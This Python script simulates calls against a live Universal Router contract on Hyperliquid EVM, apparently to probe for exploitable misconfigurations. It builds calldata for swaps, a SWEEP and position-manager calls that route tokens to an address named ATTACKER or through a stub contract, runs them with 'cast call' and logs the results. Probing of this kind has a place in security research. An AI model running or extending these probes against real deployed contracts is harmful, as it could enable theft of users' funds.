#!/usr/bin/env python3
# Round 2: misconfigured-command probes + corrected dynamic tuple encodings.
import subprocess, json
from eth_abi import encode as abi_encode

RPC = "https://rpc.hyperliquid.xyz/evm"
UR = "0xE65081EFa5ad4A196B1Df768716c337e6AB140E9"
FWWETH = "0x9e1148bC3665a9f7C35F313d89c0432c34928AEf"
FWUETH = "0x0C47cbbEDE5d8c6f9614cF770C26c3315205C397"
WHYPE = "0x5555555555555555555555555555555555555555"
ATTACKER = "0x00000000000000000000000000000000DeaDBeef"
STUB = "0x69099cc542aa0f6b08367d99a5a01f48bed61122"

def exec_calldata(cmds, inputs, deadline=2**32-1):
    return bytes.fromhex("3593564c") + abi_encode(["bytes", "bytes[]", "uint256"], [cmds, inputs, deadline])

def cast_call(to, data, frm=ATTACKER, value=None):
    if isinstance(data, (bytes, bytearray)):
        data = "0x" + bytes(data).hex()
    cmd = ["cast", "call", to, data, "--from", frm, "--rpc-url", RPC]
    if value is not None:
        cmd += ["--value", str(value)]
    p = subprocess.run(cmd, capture_output=True, text=True)
    out = (p.stdout.strip() or p.stderr.strip()).replace("\n", " ")
    return ("OK  " if p.returncode == 0 else "ERR ") + out[:170]

results = []
def add(name, desc, to, data, frm=ATTACKER, value=None):
    r = cast_call(to, data, frm, value)
    results.append({"case": name, "desc": desc, "to": to, "from": frm, "value": value,
                    "call": data.hex() if isinstance(data, (bytes, bytearray)) else data, "result": r})
    print(f"{name:34s} {r}")

path = [FWWETH, FWUETH]
# M) FEW_V2 payerIsUser=true, no permit2 allowance
inp_m = abi_encode(["address", "uint256", "uint256", "address[]", "bool"], [ATTACKER, 1, 0, path, True])
add("M_FEWV2_USER_NOP2", "FEW_V2_SWAP_EXACT_IN payerIsUser=true, no Permit2", UR, exec_calldata(bytes([0x23]), [inp_m]))
# N) FEW_V2 payerIsUser=false, router balance 0
inp_n = abi_encode(["address", "uint256", "uint256", "address[]", "bool"], [ATTACKER, 1, 0, path, False])
add("N_FEWV2_ROUTERBAL", "FEW_V2_SWAP_EXACT_IN payerIsUser=false, router 0", UR, exec_calldata(bytes([0x23]), [inp_n]))
# O) SWEEP fwWHYPE min=0
add("O_SWEEP_FWW_min0", "SWEEP fwWHYPE (0) to attacker", UR, exec_calldata(bytes([0x04]), [abi_encode(["(address,address,uint256)"], [(FWWETH, ATTACKER, 0)])]))
# P) V4_POSITION_MANAGER_CALL -> stub
pkey = abi_encode(["address", "address", "uint24", "int24", "address"], [WHYPE, FWWETH, 3000, 60, STUB])
modify = bytes.fromhex("dd46508f") + abi_encode(["bytes", "uint256"], [b"\x00", 2**32-1])  # modifyLiquidities selector + dummy
add("P_V4PM_CALL", "V4_POSITION_MANAGER_CALL to stub v4PM", UR, exec_calldata(bytes([0x14]), [modify]))
# Q) V3_POSITION_MANAGER_CALL -> stub
v3call = bytes.fromhex("0c49ccbe") + abi_encode(["uint256", "uint128", "uint256", "uint256", "uint256"], [1, 0, 0, 0, 2**32-1])
add("Q_V3PM_CALL", "V3_POSITION_MANAGER_CALL to stub v3PM", UR, exec_calldata(bytes([0x12]), [v3call]))
# R) vanilla V2 swap through misconfigured factory (hash=0)
inp_r = abi_encode(["address", "uint256", "uint256", "address[]", "bool"], [ATTACKER, 1, 0, path, False])
add("R_V2SWAP_STUB", "V2_SWAP_EXACT_IN via 0x6909 factory (hash=0)", UR, exec_calldata(bytes([0x08]), [inp_r]))
# S) direct view calls on stub
add("S_STUB_OWNEROF", "stub.ownerOf(1)", STUB, "0x" + bytes.fromhex("6352211e") + abi_encode(["uint256"], [1]).hex())
# T) WRAP_ETH with cmd 0x0b amount=1 (router has 0 ETH) -> revert
add("T_WRAPETH_NOBAL", "WRAP_ETH 1 wei (router 0 ETH)", UR, exec_calldata(bytes([0x0b]), [abi_encode(["(address,uint256)"], [(ATTACKER, 1)])]))

json.dump(results, open("sim_results_round2.json", "w"), indent=1)
print("\nsaved sim_results_round2.json")
